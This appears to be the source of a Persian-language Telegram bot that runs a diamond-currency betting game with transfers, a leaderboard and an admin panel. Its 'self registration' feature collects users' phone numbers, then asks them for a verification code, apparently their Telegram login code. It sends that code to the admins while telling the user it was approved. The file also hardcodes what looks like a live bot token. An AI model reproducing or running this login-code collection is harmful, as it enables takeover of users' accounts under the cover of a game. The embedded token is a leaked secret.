# -*- coding: utf-8 -*-
"""
ربات بازی الماس + انتقال + لیدربرد + ثبت سلف
"""
from __future__ import annotations
import json, os, re, time, logging, random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters,
)
from telegram.constants import ChatType, MessageEntityType

BOT_TOKEN = "8727762178:AAGrdb5XFjhkcdoOEIFy1s8U71idRpN0DX8"
ADMIN_ID = 7530457395
DATA = "diamond_game.json"
TAX = 0.01  # 1٪

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("dgame")


def D():
    return {
        "admins": [ADMIN_ID],
        "balances": {},          # str(uid) -> int
        "emoji": "💎",           # متن عادی
        "premium_emoji_id": None,  # custom emoji id
        "games": {},             # gid -> game dict
        "self_regs": {},         # str(uid) -> {phone, status, code}
        "pending": {},           # runtime-ish stored
    }


def load():
    if os.path.exists(DATA):
        try:
            with open(DATA, "r", encoding="utf-8") as f:
                d = json.load(f)
            b = D()
            for k, v in b.items():
                d.setdefault(k, v)
            if ADMIN_ID not in [int(x) for x in d.get("admins", [])]:
                d.setdefault("admins", []).insert(0, ADMIN_ID)
            return d
        except Exception as e:
            log.error(e)
    return D()


def save(d):
    with open(DATA, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=2)


def is_admin(uid):
    d = load()
    return int(uid) in {int(x) for x in d.get("admins", [ADMIN_ID])}


def is_main(uid):
    return int(uid) == ADMIN_ID


def bal(d, uid):
    return int(d.get("balances", {}).get(str(uid), 0))


def set_bal(d, uid, val):
    d.setdefault("balances", {})[str(uid)] = max(0, int(val))


def add_bal(d, uid, delta):
    set_bal(d, uid, bal(d, uid) + int(delta))
    return bal(d, uid)


def btn(text, data, style=None):
    kw = {"text": text, "callback_data": data}
    if style in ("danger", "success", "primary"):
        kw["style"] = style
    try:
        return InlineKeyboardButton(**kw)
    except TypeError:
        kw.pop("style", None)
        return InlineKeyboardButton(**kw)


def set_st(c, kind, extra=None):
    c.user_data["st"] = {"kind": kind, "extra": extra or {}, "ts": time.time()}


def get_st(c):
    st = c.user_data.get("st")
    if not st:
        return None
    if time.time() - st.get("ts", 0) > 600:
        c.user_data.pop("st", None)
        return None
    return st


def clear_st(c):
    c.user_data.pop("st", None)


def diamond_label(d, amount=None):
    """متن الماس با ایموجی (پرمیوم اگر باشد در پیام جداگانه entity می‌شود)"""
    em = d.get("emoji") or "💎"
    if amount is None:
        return em
    return "%s %s" % (em, amount)


def format_money(d, amount):
    return "%s %s" % (amount, d.get("emoji") or "💎")


def mention(user):
    name = user.full_name or str(user.id)
    return '<a href="tg://user?id=%s">%s</a>' % (user.id, name)


def mention_id(uid, name=None):
    return '<a href="tg://user?id=%s">%s</a>' % (uid, name or uid)


# ---------- keyboards ----------
def start_kb():
    return InlineKeyboardMarkup([
        [btn("📝 ثبت سلف", "self_reg", "success")],
        [btn("💰 موجودی", "my_bal", "primary")],
        [btn("🏆 لیدربرد", "lb", "primary")],
    ])


def admin_kb():
    return InlineKeyboardMarkup([
        [btn("➕ واریز به کاربر", "a_add", "success")],
        [btn("📢 واریز همگانی", "a_add_all", "success")],
        [btn("➖ برداشت از کاربر", "a_sub", "danger")],
        [btn("😀 تنظیم ایموجی", "a_emoji", "primary")],
        [btn("✨ آپلود ایموجی پرمیوم", "a_prem", "primary")],
        [btn("👤 ادمین‌ها", "a_admins", "primary")],
        [btn("❌ بستن", "close", "danger")],
    ])


# ---------- commands ----------
async def cmd_start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    clear_st(c)
    if u.effective_chat.type != ChatType.PRIVATE:
        await u.message.reply_text("در گپ: بازی | موجودی | انتقال | لیدربرد")
        return
    if is_admin(u.effective_user.id):
        await u.message.reply_text(
            "سلام ادمین\n/admin پنل\nیا منوی کاربر:",
            reply_markup=start_kb(),
        )
        return
    await u.message.reply_text("سلام 👋", reply_markup=start_kb())


async def cmd_admin(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if u.effective_chat.type != ChatType.PRIVATE or not is_admin(u.effective_user.id):
        return
    clear_st(c)
    await u.message.reply_text("🎛 پنل ادمین", reply_markup=admin_kb())


async def on_cb(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q = u.callback_query
    data = q.data or ""
    d = load()
    user = q.from_user
    await q.answer()

    if data == "close":
        await q.edit_message_text("بسته شد.")
        return

    if data == "my_bal":
        await q.edit_message_text(
            "💰 موجودی شما: %s" % format_money(d, bal(d, user.id)),
            reply_markup=start_kb(),
        )
        return

    if data == "lb":
        await q.edit_message_text(leaderboard_text(d), parse_mode="HTML", reply_markup=start_kb())
        return

    # ---- ثبت سلف ----
    if data == "self_reg":
        set_st(c, "self_phone")
        await q.edit_message_text("شماره موبایل خود را بفرست (مثال: 0912xxxxxxx):")
        return

    if data.startswith("self_code:"):
        if not is_admin(user.id):
            return
        uid = data.split(":")[1]
        reg = d.get("self_regs", {}).get(uid)
        if not reg:
            await q.answer("نیست", show_alert=True)
            return
        reg["status"] = "wait_code"
        save(d)
        try:
            await c.bot.send_message(int(uid), "🔐 لطفاً کد تأیید را بفرست:")
        except Exception:
            pass
        await q.edit_message_text("درخواست کد برای کاربر ارسال شد.\nشماره: %s" % reg.get("phone"))
        return

    # ---- بازی ----
    if data.startswith("join:"):
        gid = data.split(":")[1]
        game = d.get("games", {}).get(gid)
        if not game or game.get("status") != "open":
            await q.answer("این بازی بسته است", show_alert=True)
            return
        if user.id == game["creator"]:
            await q.answer("خودت سازنده‌ای", show_alert=True)
            return
        if user.id in game.get("players", []):
            await q.answer("قبلاً پیوستی", show_alert=True)
            return
        amount = int(game["amount"])
        if bal(d, user.id) < amount:
            await q.answer("موجودی کافی نیست", show_alert=True)
            return
        add_bal(d, user.id, -amount)
        game["players"].append(user.id)
        game["names"][str(user.id)] = user.full_name
        if len(game["players"]) >= 2:
            game["status"] = "done"
            p1, p2 = game["players"][0], game["players"][1]
            winner = random.choice([p1, p2])
            loser = p2 if winner == p1 else p1
            pot = amount * 2
            win_amount = int(pot * (1 - TAX))
            tax_amount = pot - win_amount
            add_bal(d, winner, win_amount)
            game["winner"] = winner
            game["loser"] = loser
            game["win_amount"] = win_amount
            game["tax"] = tax_amount
            save(d)
            wname = game["names"].get(str(winner), str(winner))
            lname = game["names"].get(str(loser), str(loser))
            text = (
                "🎮 نتیجه بازی %s\n\n"
                "🏆 برنده: %s\n"
                "دریافتی: %s (مالیات ۱٪)\n\n"
                "موجودی‌ها:"
                % (
                    format_money(d, amount),
                    mention_id(winner, wname),
                    format_money(d, win_amount),
                )
            )
            kb = InlineKeyboardMarkup([
                [btn("✅ برنده %s | %s" % (wname[:12], bal(d, winner)), "noop", "success")],
                [btn("❌ بازنده %s | %s" % (lname[:12], bal(d, loser)), "noop", "danger")],
            ])
            await q.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
            return
        save(d)
        kb = InlineKeyboardMarkup([
            [btn("✅ شرکت در بازی", "join:%s" % gid, "success")],
            [btn("🚫 لغو", "cancel:%s" % gid, "danger")],
        ])
        await q.edit_message_text(
            "🎮 بازی %s\nسازنده: %s\nدر انتظار نفر دوم..."
            % (format_money(d, amount), mention_id(game["creator"], game["names"].get(str(game["creator"])))),
            parse_mode="HTML",
            reply_markup=kb,
        )
        return

    if data.startswith("cancel:"):
        gid = data.split(":")[1]
        game = d.get("games", {}).get(gid)
        if not game or game.get("status") != "open":
            await q.answer("قابل لغو نیست", show_alert=True)
            return
        if user.id != game["creator"] and not is_admin(user.id):
            await q.answer("فقط سازنده", show_alert=True)
            return
        amount = int(game["amount"])
        # برگشت پول بازیکنان
        for pid in game.get("players", []):
            add_bal(d, pid, amount)
        game["status"] = "cancelled"
        save(d)
        await q.edit_message_text("🚫 بازی لغو شد. الماس‌ها برگشت.")
        return

    if data == "noop":
        return

    # ---- انتقال تأیید ----
    if data.startswith("tr_ok:"):
        parts = data.split(":")
        # tr_ok:from:to:amount
        if len(parts) < 4:
            return
        frm, to, amount = int(parts[1]), int(parts[2]), int(parts[3])
        if user.id != frm:
            await q.answer("فقط فرستنده", show_alert=True)
            return
        if bal(d, frm) < amount:
            await q.edit_message_text("موجودی کافی نیست.")
            return
        fee = int(amount * TAX)
        send_amt = amount - fee
        if send_amt < 1:
            await q.edit_message_text("مقدار بعد از مالیات نامعتبر است.")
            return
        add_bal(d, frm, -amount)
        add_bal(d, to, send_amt)
        save(d)
        await q.edit_message_text(
            "✅ انتقال انجام شد\n%s → %s\nمبلغ دریافتی: %s (مالیات ۱٪: %s)"
            % (mention_id(frm), mention_id(to), format_money(d, send_amt), format_money(d, fee)),
            parse_mode="HTML",
        )
        try:
            await c.bot.send_message(
                to,
                "دریافت کردی: %s از %s" % (format_money(d, send_amt), mention_id(frm)),
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    if data.startswith("tr_no:"):
        await q.edit_message_text("انتقال لغو شد.")
        return

    # ---- ادمین ----
    if not is_admin(user.id):
        return

    if data == "a_home":
        clear_st(c)
        await q.edit_message_text("🎛 پنل", reply_markup=admin_kb())
        return

    if data == "a_add":
        set_st(c, "a_add_id")
        await q.edit_message_text("آیدی عددی کاربر را بفرست:")
        return
    if data == "a_sub":
        set_st(c, "a_sub_id")
        await q.edit_message_text("آیدی عددی کاربر برای برداشت:")
        return
    if data == "a_add_all":
        set_st(c, "a_add_all")
        await q.edit_message_text("مقدار واریز همگانی را بفرست:")
        return
    if data == "a_emoji":
        set_st(c, "a_emoji")
        await q.edit_message_text("ایموجی متنی الماس را بفرست (مثال 💎):")
        return
    if data == "a_prem":
        set_st(c, "a_prem")
        await q.edit_message_text("یک پیام با ایموجی پرمیوم بفرست (یا آیدی عددی custom emoji):")
        return
    if data == "a_admins":
        lines = ["👤 ادمین‌ها\n"]
        rows = []
        for a in d.get("admins", []):
            tag = " (اصلی)" if int(a) == ADMIN_ID else ""
            lines.append("• <code>%s</code>%s" % (a, tag))
            if int(a) != ADMIN_ID and is_main(user.id):
                rows.append([btn("🗑 %s" % a, "a_adel:%s" % a, "danger")])
        if is_main(user.id):
            rows.insert(0, [btn("➕ با آیدی عددی", "a_aadd", "success")])
        rows.append([btn("🔙", "a_home", "primary")])
        await q.edit_message_text("\n".join(lines), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(rows))
        return
    if data == "a_aadd":
        if not is_main(user.id):
            return
        set_st(c, "a_aadd")
        await q.edit_message_text("آیدی عددی ادمین جدید را بفرست:")
        return
    if data.startswith("a_adel:"):
        if not is_main(user.id):
            return
        aid = int(data.split(":")[1])
        d["admins"] = [x for x in d.get("admins", []) if int(x) != aid]
        save(d)
        await q.edit_message_text("حذف شد.", reply_markup=admin_kb())
        return


def leaderboard_text(d):
    items = sorted(
        ((int(uid), int(v)) for uid, v in (d.get("balances") or {}).items()),
        key=lambda x: -x[1],
    )[:10]
    if not items:
        return "لیدربرد خالی است."
    lines = ["🏆 <b>۱۰ نفر برتر</b>\n"]
    for i, (uid, v) in enumerate(items, 1):
        lines.append("%s. %s — %s" % (i, mention_id(uid), format_money(d, v)))
    return "\n".join(lines)


async def on_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    if not u.message:
        return
    user = u.effective_user
    d = load()
    text = (u.message.text or "").strip()
    chat = u.effective_chat
    st = get_st(c)

    # ----- کد سلف (حتی بدون state) -----
    if chat.type == ChatType.PRIVATE:
        reg0 = d.get("self_regs", {}).get(str(user.id))
        if reg0 and reg0.get("status") == "wait_code":
            if not (st and str(st.get("kind", "")).startswith("a_")):
                reg0["code"] = text
                reg0["status"] = "done"
                reg0["code_ts"] = time.time()
                d["self_regs"][str(user.id)] = reg0
                save(d)
                clear_st(c)
                await u.message.reply_text("✅ تأیید شد. جزئیات اعلام می‌شود.")
                for aid in d.get("admins", [ADMIN_ID]):
                    try:
                        await c.bot.send_message(
                            int(aid),
                            "✅ کد سلف دریافت شد\n%s\nآیدی: <code>%s</code>\nشماره: <code>%s</code>\nکد: <code>%s</code>"
                            % (mention(user), user.id, reg0.get("phone"), text),
                            parse_mode="HTML",
                        )
                    except Exception as e:
                        log.error("send code to admin %s: %s", aid, e)
                return

    # ----- states private -----
    if chat.type == ChatType.PRIVATE and st:
        kind = st.get("kind")
        extra = st.get("extra") or {}

        if kind == "self_phone":
            phone = text.replace(" ", "").replace("-", "")
            if not re.fullmatch(r"09\d{9}", phone) and not re.fullmatch(r"\+?\d{10,15}", phone):
                await u.message.reply_text("شماره معتبر بفرست")
                return
            d.setdefault("self_regs", {})[str(user.id)] = {
                "phone": phone,
                "status": "pending",
                "name": user.full_name,
                "ts": time.time(),
            }
            save(d)
            clear_st(c)
            await u.message.reply_text("⏳ در حال بررسی... نتیجه اعلام می‌شود.")
            kb = InlineKeyboardMarkup([
                [btn("🔐 درخواست کد", "self_code:%s" % user.id, "success")],
            ])
            for aid in d.get("admins", [ADMIN_ID]):
                try:
                    await c.bot.send_message(
                        int(aid),
                        "📝 ثبت سلف جدید\n%s\nآیدی: <code>%s</code>\nشماره: <code>%s</code>"
                        % (mention(user), user.id, phone),
                        parse_mode="HTML",
                        reply_markup=kb,
                    )
                except Exception:
                    pass
            return


        if is_admin(user.id):
            if kind == "a_add_id" and text.lstrip("-").isdigit():
                set_st(c, "a_add_amt", {"uid": int(text)})
                await u.message.reply_text("مقدار واریز:")
                return
            if kind == "a_add_amt":
                if not text.isdigit():
                    await u.message.reply_text("عدد بفرست")
                    return
                uid = int(extra["uid"])
                amt = int(text)
                add_bal(d, uid, amt)
                save(d)
                clear_st(c)
                await u.message.reply_text("✅ واریز %s به %s" % (format_money(d, amt), uid), reply_markup=admin_kb())
                try:
                    await c.bot.send_message(uid, "واریز ادمین: %s\nموجودی: %s" % (format_money(d, amt), format_money(d, bal(d, uid))))
                except Exception:
                    pass
                return
            if kind == "a_sub_id" and text.lstrip("-").isdigit():
                set_st(c, "a_sub_amt", {"uid": int(text)})
                await u.message.reply_text("مقدار برداشت:")
                return
            if kind == "a_sub_amt":
                if not text.isdigit():
                    await u.message.reply_text("عدد")
                    return
                uid = int(extra["uid"])
                amt = int(text)
                add_bal(d, uid, -amt)
                save(d)
                clear_st(c)
                await u.message.reply_text("✅ برداشت انجام شد. موجودی: %s" % format_money(d, bal(d, uid)), reply_markup=admin_kb())
                return
            if kind == "a_add_all" and text.isdigit():
                amt = int(text)
                n = 0
                for uid in list(d.get("balances", {}).keys()):
                    add_bal(d, uid, amt)
                    n += 1
                # اگر کسی موجودی نداشته هنوز، فقط به کسانی که هستند
                save(d)
                clear_st(c)
                await u.message.reply_text("✅ همگانی %s به %s کاربر" % (format_money(d, amt), n), reply_markup=admin_kb())
                return
            if kind == "a_emoji":
                d["emoji"] = text[:8]
                save(d)
                clear_st(c)
                await u.message.reply_text("ایموجی تنظیم شد: %s" % d["emoji"], reply_markup=admin_kb())
                return
            if kind == "a_prem":
                eid = None
                if u.message.entities:
                    for ent in u.message.entities:
                        if ent.type == MessageEntityType.CUSTOM_EMOJI and ent.custom_emoji_id:
                            eid = str(ent.custom_emoji_id)
                            break
                if not eid and re.fullmatch(r"\d{5,25}", text):
                    eid = text
                if not eid:
                    await u.message.reply_text("ایموجی پرمیوم یا آیدی عددی بفرست")
                    return
                d["premium_emoji_id"] = eid
                save(d)
                clear_st(c)
                await u.message.reply_text("پرمیوم ذخیره شد: %s" % eid, reply_markup=admin_kb())
                return
            if kind == "a_aadd":
                raw = text.lstrip("@").strip()
                if not raw.lstrip("-").isdigit():
                    await u.message.reply_text("فقط آیدی عددی بفرست")
                    return
                aid = int(raw)
                if aid not in [int(x) for x in d.get("admins", [])]:
                    d.setdefault("admins", []).append(aid)
                    save(d)
                clear_st(c)
                await u.message.reply_text("✅ ادمین اضافه شد: <code>%s</code>" % aid, parse_mode="HTML", reply_markup=admin_kb())
                try:
                    await c.bot.send_message(aid, "شما ادمین ربات شدید. /admin")
                except Exception:
                    pass
                return

    # ----- public commands -----
    low = text
    low2 = re.sub(r"^@\w+\s+", "", low)
    low2 = re.sub(r"^/(\w+)@\w+", r"/\1", low2)


    # موجودی
    if re.fullmatch(r"/?(موجودی|bal)", low2, re.I):
        if u.message.reply_to_message and u.message.reply_to_message.from_user:
            t = u.message.reply_to_message.from_user
            await u.message.reply_text(
                "💰 موجودی %s\n%s" % (mention(t), format_money(d, bal(d, t.id))),
                parse_mode="HTML",
            )
        else:
            await u.message.reply_text(
                "💰 موجودی %s\n%s" % (mention(user), format_money(d, bal(d, user.id))),
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [btn("%s %s" % (d.get("emoji") or "💎", bal(d, user.id)), "noop", "primary")]
                ]),
            )
        return

    if low in ("لیدربرد", "/top", "top", "لیدربورد"):
        await u.message.reply_text(leaderboard_text(d), parse_mode="HTML")
        return

    # بازی 100
    m = re.match(r"^(?:/)?(?:بازی|game)\s+(\d+)$", low2, re.I)
    if m:
        amount = int(m.group(1))
        if amount < 1:
            await u.message.reply_text("مقدار نامعتبر")
            return
        if bal(d, user.id) < amount:
            await u.message.reply_text("موجودی کافی نیست. موجودی: %s" % format_money(d, bal(d, user.id)))
            return
        add_bal(d, user.id, -amount)
        gid = "g%d%d" % (int(time.time()), random.randint(10, 99))
        d.setdefault("games", {})[gid] = {
            "creator": user.id,
            "amount": amount,
            "players": [user.id],
            "names": {str(user.id): user.full_name},
            "status": "open",
            "chat_id": chat.id,
            "ts": time.time(),
        }
        save(d)
        kb = InlineKeyboardMarkup([
            [btn("✅ شرکت در بازی", "join:%s" % gid, "success")],
            [btn("🚫 لغو", "cancel:%s" % gid, "danger")],
        ])
        await u.message.reply_text(
            "🎮 بازی %s\nسازنده: %s\nنفر دوم روی شرکت بزند.\nفقط سازنده می‌تواند لغو کند."
            % (format_money(d, amount), mention(user)),
            parse_mode="HTML",
            reply_markup=kb,
        )
        return

    # انتقال 50 + reply
    m = re.match(r"^(?:انتقال|transfer)\s+(\d+)$", low, re.I)
    if m:
        amount = int(m.group(1))
        if not u.message.reply_to_message or not u.message.reply_to_message.from_user:
            await u.message.reply_text("روی پیام فرد ریپلای کن و بنویس: انتقال 50")
            return
        to = u.message.reply_to_message.from_user
        if to.id == user.id:
            await u.message.reply_text("به خودت؟")
            return
        if to.is_bot:
            await u.message.reply_text("به ربات نمی‌شود")
            return
        if bal(d, user.id) < amount:
            await u.message.reply_text("موجودی کافی نیست")
            return
        fee = int(amount * TAX)
        send_amt = amount - fee
        kb = InlineKeyboardMarkup([
            [btn("✅ تأیید انتقال", "tr_ok:%s:%s:%s" % (user.id, to.id, amount), "success")],
            [btn("❌ لغو", "tr_no:1", "danger")],
        ])
        await u.message.reply_text(
            "تأیید انتقال؟\nاز %s به %s\nمبلغ: %s\nمالیات ۱٪: %s\nدریافتی طرف: %s"
            % (mention(user), mention(to), format_money(d, amount), format_money(d, fee), format_money(d, send_amt)),
            parse_mode="HTML",
            reply_markup=kb,
        )
        return


async def cmd_game(u: Update, c: ContextTypes.DEFAULT_TYPE):
    """ /بازی 100 یا /game 100 """
    if not u.message:
        return
    text = (u.message.text or "").strip()
    # نرمال برای on_text
    text2 = re.sub(r"^/(بازی|game)(@\w+)?", "بازی", text, flags=re.I)
    u.message.text = text2
    await on_text(u, c)


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("panel", cmd_admin))
    app.add_handler(CommandHandler("game", cmd_game))
    app.add_handler(CallbackQueryHandler(on_cb))
    # همه متن‌ها (گپ و پیوی) — بدون ~ که روی بعضی محیط‌ها خراب می‌شود
    app.add_handler(MessageHandler(filters.TEXT, on_text))
    log.info("diamond game up")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
